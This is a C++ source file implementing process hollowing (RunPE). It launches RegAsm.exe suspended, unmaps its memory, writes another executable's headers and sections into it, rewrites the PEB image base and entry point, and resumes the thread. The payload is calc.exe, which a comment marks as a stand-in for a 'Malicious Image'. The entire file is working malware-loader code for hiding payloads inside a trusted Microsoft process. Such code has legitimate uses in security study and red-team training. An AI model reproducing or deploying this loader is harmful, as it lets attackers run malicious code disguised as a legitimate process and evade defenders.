// RunPe.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>

#include "map.h"
int main()
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    CONTEXT ctx = {};

    SecureZeroMemory(&ctx, sizeof(ctx));


    ctx.ContextFlags = CONTEXT_FULL;
    


    //Malicious Image or good old calc.exe
    const PVOID pMaliciousImage = GetFileContent((LPSTR)"C:\\Windows\\System32\\calc.exe");



    //secure version of zeromemory
    SecureZeroMemory(&si, sizeof(si));

    //program to start
    LPSTR commandline = (LPSTR)"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe";

    //create the process in suspened mode
    if (!CreateProcessA(commandline, NULL, NULL, NULL, false, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {

        printf("Process Creation Failed (%d)\n", pi.dwProcessId);
        return 1;
    }


    printf("Process Creation Success (%d).....\n", pi.dwProcessId);



    //get the header information about the malware image
    PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pMaliciousImage;
    PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS32)((DWORD)pMaliciousImage + pDOSHeader->e_lfanew);
    



    if (pDOSHeader->e_magic != IMAGE_DOS_SIGNATURE) // Check for valid executable
    {
        printf("\nError: Invalid executable format.\n");
        TerminateProcess(pi.hProcess, 1); // We failed, terminate the child process.
        return 1;
    }
    if (pNTHeaders->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
        printf("\nError: Invalid executable, must me x86 bit.\n");
        TerminateProcess(pi.hProcess, 1); // We failed, terminate the child process.
        return 1;
    }

    HMODULE ntdll = GetModuleHandleA("ntdll");
    pZwUnmapViewOfSection myZwUnmapViewOfSection = (pZwUnmapViewOfSection)(GetProcAddress(ntdll, "ZwUnmapViewOfSection"));


    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("Failed To Get Thread (%d)\n", pi.dwProcessId);
        return 1;
    }

    printf("Got Thread Context (0x%d).......\n", ctx.Ebx);

    myZwUnmapViewOfSection(pi.hProcess, GetModuleHandleW(NULL));


    DWORD sizeOfMaliciousImage = pNTHeaders->OptionalHeader.SizeOfImage;

    LPVOID pHollowAddress = VirtualAllocEx(
        pi.hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
        (LPVOID)pNTHeaders->OptionalHeader.ImageBase, // Base address of the process
        sizeOfMaliciousImage, // Byte size obtained from optional header
        MEM_RESERVE | MEM_COMMIT, // Reserves and commits pages (MEM_RESERVE | MEM_COMMIT)
        PAGE_EXECUTE_READWRITE // Enabled execute and read/write access (PAGE_EXECUTE_READWRITE)
    );


    if (!WriteProcessMemory(pi.hProcess, pHollowAddress, pMaliciousImage, pNTHeaders->OptionalHeader.SizeOfHeaders, NULL)) {
        printf("Could Not Write To (0x%d).....\n", pHollowAddress);
        return 1;
    }
    printf("Wrote To Process Memory To (0x%d).....\n", pHollowAddress);

    LPVOID lpPebImageBase = (LPVOID)(DWORD)(ctx.Ebx + sizeof(LPVOID) *  2);

    DWORD* ImageBase;

    if (!ReadProcessMemory(pi.hProcess, lpPebImageBase, &ImageBase, sizeof(ImageBase), NULL)) {
        printf("Failed Read Process Memory (0x%d)\n", pi.dwProcessId);
        return 1;
    }    
    
    //write the image to the process
    IMAGE_SECTION_HEADER* lpSectionHeaderArray;
    

    for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) {
        lpSectionHeaderArray = (PIMAGE_SECTION_HEADER)((DWORD)pMaliciousImage + pDOSHeader->e_lfanew + 248 + (i * 40));
        printf("Writing %s section to 0x%p\r\n", lpSectionHeaderArray->Name, (PVOID)((LPBYTE)pHollowAddress + lpSectionHeaderArray->VirtualAddress));
        WriteProcessMemory(pi.hProcess, (PVOID)((DWORD)pHollowAddress + lpSectionHeaderArray->VirtualAddress), (LPVOID)((DWORD)pMaliciousImage + lpSectionHeaderArray->PointerToRawData), lpSectionHeaderArray->SizeOfRawData, NULL);
    }
    
    if (!WriteProcessMemory(pi.hProcess, lpPebImageBase, (LPVOID)&pNTHeaders->OptionalHeader.ImageBase,4, NULL)) {
        printf("Failed To Write 0x%d\n", ctx.Ebx);
        return 1;
    
    }

    ctx.Eax = (DWORD)pHollowAddress + pNTHeaders->OptionalHeader.AddressOfEntryPoint;

    if (!SetThreadContext(pi.hThread, &ctx)) {
        printf("Error setting context\n");
        return 1;
    }

   
    if (!ResumeThread(pi.hThread)) {
        printf("Error resuming thread \n");
        return 1;
    }

    VirtualFree(pMaliciousImage, 0, MEM_RELEASE);

    printf("Process Resumed Success (%d).....\n", pi.dwProcessId);
}
